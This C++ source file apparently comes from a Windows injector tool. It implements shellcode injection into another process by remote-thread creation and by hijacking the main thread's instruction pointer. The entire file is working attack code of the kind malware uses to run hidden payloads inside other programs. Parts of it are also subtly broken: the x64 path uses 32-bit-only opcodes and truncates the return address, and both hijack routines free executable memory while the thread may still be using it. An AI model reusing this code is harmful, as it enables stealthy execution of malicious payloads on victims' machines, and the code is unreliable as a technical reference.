#include "inject.h"

void injector_t::inject_shellcode_crt(const PROCESS_INFO& process_info, const std::vector<BYTE>& shellcode)
{
   
    // allocate memory for the shellcode
    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocated == NULL)
    {
        print_error(GetLastError());
        return;
    }

    // injecting the shellcode into the process
    SIZE_T bytes_written;
    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
    {
        print_error(GetLastError());
        return;
    }

    // execute the shellcode
    HANDLE thread = CreateRemoteThread(process_info.handle.get(), NULL, NULL, (LPTHREAD_START_ROUTINE)allocated, NULL, NULL, NULL);
    if (thread == NULL)
    {
        print_error(GetLastError());
        return;
    }
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);

    // free the allocated memory
    if (!VirtualFreeEx(process_info.handle.get(), allocated, 0, MEM_RELEASE))
    {
        print_error(GetLastError());
        return;
    }
}

void injector_t::inject_shellcode_mth_x64(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode)
{
    std::vector<BYTE> prologue  = { 0x60, 0x9c }; // pushal; pushfd
    std::vector<BYTE> epilogue  = { 0x9d, 0x61 }; // popfd; popal
    std::vector<BYTE> un_hijack = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3}; // push originaEIP; retn
    
    // prepare shellcode for this method
    shellcode.insert(shellcode.begin(), prologue.begin(),  prologue.end());
    shellcode.insert(shellcode.end(),   epilogue.begin(),  epilogue.end());
    shellcode.insert(shellcode.end(),   un_hijack.begin(), un_hijack.end());

    // obtain the handle to the main thread
    HANDLE main_thread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, process_info.tid);
    if (main_thread == NULL)
    {
        print_error(GetLastError());
        return;
    }

    // suspend the main thread before hijacking
    DWORD suspend_count = SuspendThread(main_thread);
    if (suspend_count == (DWORD)-1)
    {
        print_error(GetLastError());
        return;
    }

    // obtain the context of main thread
    CONTEXT context;
    context.ContextFlags = CONTEXT_ALL;
    if (GetThreadContext(main_thread, &context))
    {
        // restore the previous entry point
        shellcode[shellcode.size() - 1 - 4] = (BYTE)context.Rip;
        shellcode[shellcode.size() - 1 - 3] = (BYTE)(context.Rip >> 8);
        shellcode[shellcode.size() - 1 - 2] = (BYTE)(context.Rip >> 16);
        shellcode[shellcode.size() - 1 - 1] = (BYTE)(context.Rip >> 24);
    }
    else
    {
        print_error(GetLastError());
        return;
    }

    // allocate memory for the shellcode
    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocated == NULL)
    {
        print_error(GetLastError());
        return;
    }

    // injecting the shellcode into the process
    SIZE_T bytes_written;
    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
    {
        print_error(GetLastError());
        return;
    }

    // modify thread context to execute the shellcode
    context.Rip = (DWORD64)allocated;
    context.ContextFlags = CONTEXT_CONTROL;
    if (!SetThreadContext(main_thread, &context))
    {
        print_error(GetLastError());
        return;
    }

    // resume the main thread
    if (ResumeThread(main_thread) == (DWORD)-1)
    {
        print_error(GetLastError());
        return;
    }

    // close the handle to main thread and free the memory
    CloseHandle(main_thread);
    if (!VirtualFreeEx(process_info.handle.get(), allocated, 0, MEM_RELEASE))
    {
        print_error(GetLastError());
        return;
    }
}

void injector_t::inject_shellcode_mth_x86(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode)
{
    std::vector<BYTE> prologue = { 0x60, 0x9c }; // pushal; pushfd
    std::vector<BYTE> epilogue = { 0x9d, 0x61 }; // popfd; popal
    std::vector<BYTE> un_hijack = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 }; // push originaEIP; retn

                                                                          // prepare shellcode for this method
    shellcode.insert(shellcode.begin(), prologue.begin(), prologue.end());
    shellcode.insert(shellcode.end(), epilogue.begin(), epilogue.end());
    shellcode.insert(shellcode.end(), un_hijack.begin(), un_hijack.end());

    // obtain the handle to the main thread
    HANDLE main_thread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, process_info.tid);
    if (main_thread == NULL)
    {
        print_error(GetLastError());
        return;
    }

    // suspend the main thread before hijacking
    DWORD suspend_count = SuspendThread(main_thread);
    if (suspend_count == (DWORD)-1)
    {
        print_error(GetLastError());
        return;
    }

    // obtain the context of main thread
    WOW64_CONTEXT context;
    context.ContextFlags = WOW64_CONTEXT_CONTROL;
    if (Wow64GetThreadContext(main_thread, &context))
    {
        // restore the previous entry point
        shellcode[shellcode.size() - 1 - 4] = (BYTE)context.Eip;
        shellcode[shellcode.size() - 1 - 3] = (BYTE)(context.Eip >> 8);
        shellcode[shellcode.size() - 1 - 2] = (BYTE)(context.Eip >> 16);
        shellcode[shellcode.size() - 1 - 1] = (BYTE)(context.Eip >> 24);
    }
    else
    {
        print_error(GetLastError());
        return;
    }

    // allocate memory for the shellcode
    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocated == NULL)
    {
        print_error(GetLastError());
        return;
    }

    // injecting the shellcode into the process
    SIZE_T bytes_written;
    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
    {
        print_error(GetLastError());
        return;
    }

    // modify thread context to execute the shellcode
    context.Eip = (DWORD)allocated;
    context.ContextFlags = WOW64_CONTEXT_CONTROL;
    if (!Wow64SetThreadContext(main_thread, &context))
    {
        print_error(GetLastError());
        return;
    }

    // resume the main thread
    if (ResumeThread(main_thread) == (DWORD)-1)
    {
        print_error(GetLastError());
        return;
    }

    // close the handle to main thread and free the memory
    CloseHandle(main_thread);
    if (!VirtualFreeEx(process_info.handle.get(), allocated, 0, MEM_RELEASE))
    {
        print_error(GetLastError());
        return;
    }
}